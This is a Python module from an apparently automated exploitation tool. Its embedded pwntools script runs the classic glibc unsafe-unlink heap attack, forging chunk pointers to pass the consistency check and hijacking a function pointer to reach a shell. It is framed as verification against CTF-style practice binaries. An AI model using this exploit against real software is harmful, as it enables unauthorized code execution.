"""Unsafe-unlink, verified by execution.

The classic unlink() attack: when a free merges with an adjacent free chunk, glibc unlinks the victim
with `FD->bk = BK; BK->fd = FD`. glibc 2.3.4+ guards it with `FD->bk == P && BK->fd == P`; the classic
bypass forges `P->fd = &ptr-0x18` and `P->bk = &ptr-0x10`, where `ptr` is a global pointing at the
chunk -- this SATISFIES the check and makes the two writes set `ptr = &ptr-0x18`. Editing through
`ptr` then overwrites `ptr` itself to aim at a function pointer, and a second edit overwrites that
pointer -> hijack -> shell.

binoracle verifies the technique against a target whose allocator reproduces the unlink write + the
2.3.4+ consistency check, and degrades honestly otherwise. The sandbox runs with ASLR off and
`chunkptr`/`handler`/`win` are fixed symbols, so the forged fd/bk are deterministic. For
AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (unsafe-unlink driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
chunkptr = sym.get("chunkptr") or sym.get("ptr")
handler = sym.get("handler") or sym.get("fnptr")
win = sym.get("win")
if chunkptr is None or handler is None or win is None:
    print("NOT_APPLICABLE (no unsafe-unlink shape: need chunkptr+handler+win symbols)"); sys.exit(1)

# Classic bypass: P->fd = &chunkptr - 0x18, P->bk = &chunkptr - 0x10. The 2.3.4+ check
# FD->bk==P && BK->fd==P both reduce to chunkptr==P (true: chunkptr points at the chunk), and the
# unlink writes leave chunkptr = &chunkptr - 0x18.
fd = (chunkptr - 0x18) & ((1 << 64) - 1)
bk = (chunkptr - 0x10) & ((1 << 64) - 1)

MARK = b"BINORACLE_UNLINK_PWNED"
io = None
try:
    io = process([name], aslr=False)
    io.recvuntil(b"unl: ")
    io.send(p64(fd) + p64(bk))            # forge P->fd / P->bk  (satisfies the consistency check)
    io.recvuntil(b"e1: ")
    io.send(p64(handler))                 # *(chunkptr+0x18) = &chunkptr -> chunkptr = &handler
    io.recvuntil(b"e2: ")
    io.send(p64(win))                     # *chunkptr = win -> handler = win
    time.sleep(0.2)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED chunkptr=%#x handler=%#x win=%#x" % (chunkptr, handler, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autounsafeunlink(binary: str) -> dict:
    """Unsafe-unlink verificado por ejecucion (contra un asignador que reproduce la escritura de
    unlink + el chequeo de consistencia >=2.3.4). Necesita la forma de practica (chunkptr/handler/
    win). Docker o sandbox nativo (ASLR off); degrada limpio."""
    res = run_driver(binary, _DRIVER, ".binoracle_unlink.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"unsafe-unlink (bypass del chequeo 2.3.4+ con fd=&ptr-0x18/bk=&ptr-0x10): "
                   f"ptr apunta cerca de si mismo -> edicion -> hijack -> shell verificada ({eng})"
                   if res.get("verified")
                   else f"unsafe-unlink: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_unsafeunlink(r: dict) -> str:
    out = ["## Auto unsafe-unlink (unlink() corruption + bypass del chequeo, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: glibc 2.3.4+ chequea `FD->bk==P && BK->fd==P`; el bypass clasico usa "
               "fd=&ptr-0x18, bk=&ptr-0x10 (lo satisface) y deja ptr=&ptr-0x18; la verificacion "
               "reproduce la escritura de unlink y ese chequeo._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
